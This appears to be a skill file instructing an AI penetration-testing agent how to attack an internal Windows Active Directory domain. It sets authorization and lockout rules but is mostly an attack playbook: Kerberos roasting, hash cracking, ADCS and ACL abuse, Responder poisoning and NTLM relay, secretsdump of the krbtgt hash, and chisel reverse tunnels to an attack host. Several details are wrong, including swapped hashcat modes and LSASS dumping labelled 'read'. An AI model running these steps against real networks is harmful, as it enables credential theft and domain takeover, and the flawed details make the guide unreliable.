---
name: ad-internal
description: "Invoke this skill when scope includes an internal Windows network or a domain-joined host — unauthenticated SMB/LDAP enumeration, Kerberos roasting, password policy and spraying, ADCS, delegation and ACL paths, relay, and credential dumping. Assumes network reachability and carries the lockout budget rules."
---
# Active Directory and Internal Windows

Internal work is credential acquisition and path finding, not web classes. Under an **authorized** engagement only. Lockouts are the number one way to get burned: check the policy before any guess.

This skill assumes network reach to the domain (VPN, pivot, or an in-scope internal host). If reach comes from a web foothold, `privesc-postexploit` provides the pivot first.

## Hard gates

1. **Policy first.** Read the program's rule on password guessing. If silent: 3 attempts per user, spread over 30 minutes, one user at a time.
2. Read `scope.md` for named DCs, subnets and excluded hosts.
3. No `nxc` module that writes (e.g. `-M lsassy` is read; `--local-auth` spraying needs a policy).
4. Kerberoasting and AS-REP roasting are read-only but noisy; run once, store hashes.
5. Relay only when SMB signing is off — verify before starting Responder.

## Phase 1: unauthenticated discovery

```
nxc smb <cidr> -t 1 --timeout 10
nxc smb <dc> -u '' -p '' --pass-pol
ldapsearch -x -H ldap://<dc> -s base -b "" "(objectClass=*)" namingContexts
```

- Record: hostname, domain, OS build, SMB signing, guest/anonymous allowed.
- Anonymous LDAP bind and `namingContexts` give the DN; then `-b "<DN>" "(objectClass=user)"` for accounts if permitted.
- `enum4linux-ng -A <host>` if installed; otherwise nxc modules `--users`, `--groups`, `--shares`.

## Phase 2: policy and users

- `nxc smb <dc> --pass-pol`: lockout threshold, duration, observation window.
- Users: `nxc smb <dc> --users`, LDAP `sAMAccountName`, `GetADUsers.py -all <domain>/<user>:<pass> -dc-ip <dc>` once a credential exists.
- Mark high-value names: `svc_*`, `sql_*`, `admin*`, `backup*`; note descriptions containing passwords.

## Phase 3: Kerberos

- AS-REP roast (no pre-auth): `GetNPUsers.py <domain>/ -dc-ip <dc> -usersfile users.txt -format hashcat -outputfile asrep.txt`.
- Kerberoast (SPN accounts): `GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <dc> -request -outputfile kerb.txt`.
- Crack offline: `hashcat -m 18200 kerb.txt /usr/share/wordlists/passwords/10k-most-common.txt` (13100 for AS-REP, -m 13100).
- Local cracking, no target load.

## Phase 4: authenticated enumeration

```
nxc smb <cidr> -u <user> -p <pass> -t 1 --shares --sessions --loggedon-users
nxc ldap <dc> -u <user> -p <pass> --groups --users --computers
nxc ldap <dc> -u <user> -p <pass> --bloodhound -c All --dns-server <dc>
```

- BloodHound output feeds path analysis: shortest path to Domain Admin, Kerberoastable paths, unconstrained delegation, ACL edges (`GenericAll`, `WriteDACL`, `ForceChangePassword`).
- `certipy find -u <user>@<domain> -p <pass> -dc-ip <dc> -vulnerable -stdout`: ESC1-ESC8 misconfigurations, then `certipy req` for the template (write, allowed after the find).
- Shares: `smbclient //<host>/<share> -U <domain>/<user>%<pass>` — read-only browse; look for scripts, backups, `unattend.xml`, `web.config`, Group Policy Preferences (`cpassword`).

## Phase 5: exploitation paths (pick one, not all)

| Path | Tool |
|---|---|
| Kerberoast crack | hashcat offline |
| AS-REP crack | hashcat offline |
| ADCS ESC1/ESC8 | certipy req / relay to HTTP enrollment |
| Unconstrained delegation | capture with `ntlmrelayx` or `-M` printerbug |
| ACL abuse | `impacket-dacledit`, `owneredit`, `rbcd` |
| Local admin on a host | `secretsdump.py <domain>/<user>:<pass>@<host>` |

Dump once per host, not per technique: `secretsdump.py -just-dc-user krbtgt` on the DC at the end, local SAM first on members.

## Phase 6: relay and poisoning

- Confirm SMB signing off on the target: `nxc smb <host>` shows `signing:False`.
- `responder -I <iface> -rdw` (LLMNR/NBT-NS/mDNS) or `ntlmrelayx.py -tf targets.txt -smb2support` for relay.
- In a lab-like network, poisoning is fast; on a quiet profile run one poisoning method at a time.
- Capture hashes in `Responder/logs/`, crack or relay; note which hosts answered.

## Phase 7: pivoting and cleanup

- `chisel server -p 8080 --reverse` on the attack host, `chisel client <lhost>:8080 R:socks` on the foothold; proxychains for tools.
- Or `socat TCP-LISTEN:4444,fork TCP:<target>:<port>` for single ports.
- Leave nothing running on the target unless stated; kill listeners and delete uploaded binaries.

## False-positive traps

- Account lockout from over-spraying read as "password changed".
- Kerberoast hash for an account with a 25-char random password — still a finding, low crack probability.
- `signing:False` on a host without any relayable authentication.
- BloodHound edge that requires an already-privileged context.
- Trusting `--shares` output without testing read access per share.

## Tool and pacing table

| Tool | Use | Flags |
|---|---|---|
| nxc | enumeration | `-t 1 --timeout 10` |
| impacket scripts | roasting, dumping | serial |
| certipy | ADCS | serial |
| hashcat | offline cracking | local |
| chisel / socat | pivot | one tunnel |
| responder | poisoning | one interface |

## Completion self-check

- [ ] policy read and lockout budget written into `scope.md`.
- [ ] unauthenticated picture captured before any credential use.
- [ ] hashes stored and cracked offline.
- [ ] exactly one escalation path pursued, with the reason.
- [ ] tunnels and listeners torn down and noted.